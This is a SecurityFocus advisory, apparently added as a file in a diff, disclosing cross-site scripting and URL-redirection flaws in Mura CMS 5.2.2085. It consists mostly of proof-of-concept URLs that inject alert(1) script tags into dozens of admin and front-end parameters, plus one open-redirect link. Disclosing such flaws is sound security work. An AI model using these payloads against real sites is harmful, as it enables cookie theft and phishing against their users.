@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/45384/info
+
+Mura CMS is prone to multiple cross-site-scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials; other attacks are also possible.
+
+Mura CMS 5.2.2085 is vulnerable; other versions may also be affected. 
+
+1. Cross-site scripting:
+
+http://www.example.com/admin/index.cfm?email="><script>alert(1)</script>&fuseaction=cLogin.main&returnURL=1&status=sendlogin
+http://www.example.com/default/error/index.cfm?error.diagnostics="><script>alert(1)</script>
+http://www.example.com/admin/date_picker/dsp_dp_showmonth.cfm?+5=posn+1&dateLong="><script>alert(1)</script>
+http://www.example.com/admin/date_picker/index.cfm?field="><script>alert(1)</script>
+http://www.example.com/Admin/index.cfm?fuseaction=cLogin.main&returnURL=&status=sendlogin&email=<script>alert(1)</script>
+http://www.example.com/admin/view/layouts/compact.cfm?fusebox.ajax="><script>alert(1)</script>&
+http://www.example.com/admin/view/layouts/template.cfm?fusebox.ajax="><script>alert(1)</script>&myfusebox.originalcircuit=cLogin
+http://www.example.com/admin/view/layouts/template.cfm?moduleTitle=</title><body><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_editCreative.cfm?attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_editIPWhiteList.cfm?attributes.siteid="><script>alert(1)</script>&
+http://www.example.com/admin/view/vAdvertising/dsp_editPlacement.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_listAdZones.cfm?attributes.keywords="><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_listAdvertisers.cfm?attributes.keywords="><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_listCampaigns.cfm?attributes.keywords="><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_listCreatives.cfm?attributes.keywords="><script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_viewReportByCampaign.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vAdvertising/dsp_viewReportByPlacement.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vArchitecture/form/dsp_tab_related_content.cfm?attributes.siteid="><script>alert(1)</script>&session.rb=default
+http://www.example.com/admin/view/vDashboard/dsp_sessionSearch.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vDashboard/dsp_topContent.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vDashboard/dsp_topRated.cfm?session.dateKey=application.contentManager.getCrumbListrsList.contentid,<script>alert(1)</script>
+http://www.example.com/admin/view/vDashboard/dsp_topReferers.cfm?session.dateKey=application.contentManager.getCrumbListrsList.contentid,<script>alert(1)</script>
+http://www.example.com/admin/view/vDashboard/dsp_topSearches.cfm?session.dateKey=application.contentManager.getCrumbListrsList.contentid,<script>alert(1)</script>
+http://www.example.com/admin/view/vEmail_Broadcaster/dsp_form.cfm?session.dateKey=<script>alert(1)
+</script>
+http://www.example.com/admin/view/vEmail_Broadcaster/dsp_list.cfm?session.dateKey=<script>alert(1)
+</script>
+http://www.example.com/admin/view/vExtend/dsp_attribute_form.cfm?attributes.formName=TextBox,TextArea,HTMLEditor,SelectBox,MultiSelectBox,RadioGroup,File,Hidden/"><script>alert(1)
+</script>&attributes.action=TextBox,TextArea,HTMLEditor,SelectBox,MultiSelectBox,RadioGroup,File,Hi
+dden
+http://www.example.com/admin/view/vExtend/dsp_editAttributes.cfm?attributes.extendSetID="><script>alert(1)</script>&attributes.subTypeID=extendSetssattributes.siteid=attributesArraya
+http://www.example.com/admin/view/vExtend/dsp_listSets.cfm?attributes.siteid="><script>alert(1)</script>&attributes.subTypeID=extendSetss
+http://www.example.com/admin/view/vExtend/dsp_listSubTypes.cfm?attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vFeed/ajax/dsp_loadSite_old.cfm?attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vFeed/dsp_list.cfm?attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vMailingList/dsp_form.cfm?attributes.mlid=1&attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vMailingList/dsp_list_members.cfm?attributes.siteid="><script>alert(1)
+</script>
+http://www.example.com/admin/view/vPrivateUsers/dsp_group.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vPrivateUsers/dsp_secondary_menu.cfm?attributes.siteid="><script>alert(1)</script>
+http://www.example.com/admin/view/vPrivateUsers/dsp_user.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vPrivateUsers/dsp_userprofile.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vPublicUsers/dsp_group.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vPublicUsers/dsp_user.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/admin/view/vSettings/dsp_plugin_form.cfm?session.dateKey=<script>alert(1)</script>
+http://www.example.com/default/includes/display_objects/calendar/dsp_dp_showmonth.cfm?dateLong="><script>alert(1)</script>
+http://www.example.com/default/includes/display_objects/custom/fuseboxtemplates/noxml/view/layout/lay_template.cfm?body="><script>alert(1)</script>
+http://www.example.com/default/includes/display_objects/custom/fuseboxtemplates/xml/view/display/dsp_hello.cfm?runTime="><script>alert(1)</script>
+http://www.example.com/default/includes/display_objects/custom/fuseboxtemplates/xml/view/layout/lay_template.cfm?body="><script>alert(1)</script>
+http://www.example.com/default/includes/email/inc_email.cfm?bodyHtml=<script>alert(1)</script>&forward=1&rsEmail.site=pcutest@procheckup.com&
+http://www.example.com/default/includes/email/inc_email.cfm?rsEmail.site=</title><body><script>alert(1)</script>
+http://www.example.com/default/includes/themes/merced/templates/inc/header.cfm?request.siteid="><script>alert(1)</script>
+http://www.example.com/default/includes/themes/merced/templates/inc/ie_conditional_includes.cfm?event.getSite.getAssetPath=1&themePath="><script>alert(1)</script>
+http://www.example.com/default/utilities/sendtofriend.cfm?request.siteID=Default&url.link="><script>alert(1)</script>http://www.procheckup.com
+http://www.example.com/requirements/mura/geoCoding/index.cfm?
+http://www.example.com/wysiwyg/editor/plugins/selectlink/fck_selectlink.cfm?fuseaction=cArch.search&keywords="><script>alert(1)</script>&session.siteid=default
+
+2) URI redirection:
+
+http://www.example.com/admin/index.cfm?fuseaction=cLogin.main&display=login&status=failed&rememberMe=1&contentid=&LinkServID=&returnURL=http://www.example.com
